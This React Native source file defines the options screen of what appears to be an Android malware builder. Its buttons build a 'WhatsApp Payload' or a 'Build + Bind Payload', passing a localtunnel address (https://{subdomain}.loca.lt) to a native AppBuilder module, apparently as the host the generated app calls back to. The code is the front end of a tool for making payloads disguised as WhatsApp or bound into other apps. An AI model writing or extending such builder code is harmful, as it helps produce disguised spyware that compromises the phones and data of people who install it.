import React, { useState } from "react";
import { PermissionsAndroid } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    useToast
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addBuildPayloadLogs } from '../../redux/slices/userInfo'

// components
import BuildLogScreen from '../../components/BuildLogScreen'

import AppBuilder from '../../native-modules/AppBuilder'

const PayloadOptions = ({navigation}) => {
  const [visible, setVisible]= useState(false);
  const dispatch = useDispatch();
  const toast = useToast();
  const { subdomain } = useSelector((state) => state.userInfo);

  const addlog =( type, message ) => { 
    dispatch(addBuildPayloadLogs({ type, message})) 
}
  
  const handleAppBuilder = async ()=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
      navigation.navigate('payloadBuilder')
     }else{
      requestPermission();
     }
    
  }
  const handleBuilder=async()=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
       setVisible(true)
       AppBuilder.buildPayload(`https://${subdomain}.loca.lt` ,addlog)
     }else{
      requestPermission();
     }
  }

  async function requestPermission() 
   { 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
   }
  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} justifyContent={"center"} bg={"primary"} px={'10'} >
    <Button variant={'subtle'} onPress={handleBuilder} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload'}
    </Button>
    <Button onPress={handleAppBuilder} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload'}
    </Button>
    </Box>
    <BuildLogScreen visible={visible} navigation={navigation}/>
    </>
    )
};

export default PayloadOptions;

  